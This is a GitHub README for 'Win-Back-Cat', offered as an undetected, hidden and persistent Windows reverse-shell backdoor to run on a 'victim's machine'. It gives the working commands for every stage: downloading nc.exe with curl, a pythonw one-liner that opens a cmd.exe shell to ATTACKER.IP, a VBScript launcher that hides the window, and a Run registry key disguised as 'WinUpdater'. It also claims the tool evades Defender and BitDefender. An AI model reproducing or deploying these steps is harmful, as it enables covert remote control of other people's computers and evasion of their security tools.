<p>
  <h3 align="center">Win-Back-Cat</h3>
  <p align="center">
    A fully undetected, hidden, persistent, reverse netcat shell backdoor for Windows.
    <br />
    <br />
    <a href="https://github.com/RAF-87/win-back-cat/issues">Report Issue</a>
    ·
    <a href="https://github.com/RAF-87/win-back-cat/issues">Request Feature</a>
  </p>
</p>

<br />
<br />
<br />
<br />

### Prerequisites:

<br />

- You need to be logged in as an `Administrator` in order to be able to create a TCP listener with NetCat.

#### Python:
- Python should be preinstalled on latest versions of Windows.
- You can check by running `python --version` on command prompt.
- If python is not installed, you will need to install it for this to work.
#### cURL:
- If you have version 1803 or later of Windows 10, cURL is installed by default.
- If you don't have cURL you will need to install it for this to work.
- Otherwise find an alternative way to fetch `nc.exe`

<br />
<br />

<br />

### Installation / How to use:

- Very simple, download and execute (on victim's machine) the batch script: `win-back-cat.bat`.
- Run a netcat listener on attacker machine (ATTACKER.IP) to get a shell back. Example: `netcat -lvp 4445`

<br />

### Breakdown (What's in the script):

<br />

- Move into Temp folder with Environment Variable `%TEMP%` as this helps with compatibility between Windows versions.

- Fetch our Netcat version from repo with:<br />
 `curl https://raw.githubusercontent.com/RAF-87/win-back-cat/main/files/nc.exe > nc.exe`
<br />

#### Why? - Reverse Shell

<br />
We need Linux version of Netcat compiled for Windows, instead of the common OpenBSD version.
<br /><br />
The feature we need is this one:
<br />

- `-e filename`: specify `filename` to exec after connect (use with caution). Connects STDIN and STDOUT to the specified file.

<br />

In our case the `filename` will be `cmd.exe`. This flag is missing on some versions for obvious Security reasons.

<br />

#### Pythonw - Undetected

<br />

- Why `pythonw.exe` instead of `python.exe`?

`pythonw.exe` is a GUI app for launching GUI/no-UI-at-all scripts.

- NO console window is opened.
- Execution is asynchronous:
-- When invoked from a console window, the script is merely launched and the prompt returns right away, whether the script is still running or not.

- Windows trusts python. :shrug:

<br />

`pythonw -c "from subprocess import check_output; check_output('nc.exe `ATTACKER.IP` 4445 -e cmd.exe', shell=True);" >> wncat.bat`

We use `-c` to run the script as one-liner from string. We export it onto a batch script for easier execution chained with the next step.

<br />

#### Visual Basic - Hidden

<br />

`Dim WinScriptHost`<br />
`Set WinScriptHost = CreateObject("WScript.Shell")`<br />
`WinScriptHost.Run Chr(34) & "%TEMP%\wncat.bat" & Chr(34), 0`<br />
`Set WinScriptHost = Nothing`

The above script, will run our batch script as a separate process on the background without the user ever seeing anything.
We need this to keep `pythonw.exe` alive in the background, otherwise using just the batch script we would need a command prompt window always open.

<br />

#### Windows Registry - Persistent

<br />

`reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /f /v WinUpdater /t REG_SZ /d "%TEMP%\wncat.vbs"`

We add our Visual Basic script to Run from the registry entry when Windows Boots up.
So whenever we lose connection, the backdoor will reopen at the next reboot.

<br />

#### Tested on (Feel free to add to this list with a request):

<br />

- OS:           Microsoft Windows 10 Pro 10.0.18363 N/A Build 18363
- Antivirus:    Microsoft Defender, BitDefender

<br /><br />

# Note:
- Using these combined tools, Windows or Any Antivirus cannot detect this backdoor.
- Remember to edit `ATTACKER.IP` for the reverse shell to work.

<br /><br /><br />

<!-- CONTACT -->
## Contact

- LinkedIn: [https://www.linkedin.com/in/raffaele-paglietti/](https://www.linkedin.com/in/raffaele-paglietti/)
- Email: wize@deadcyber.com
- Project Link: [https://github.com/RAF-87/win-back-cat](https://github.com/RAF-87/win-back-cat)

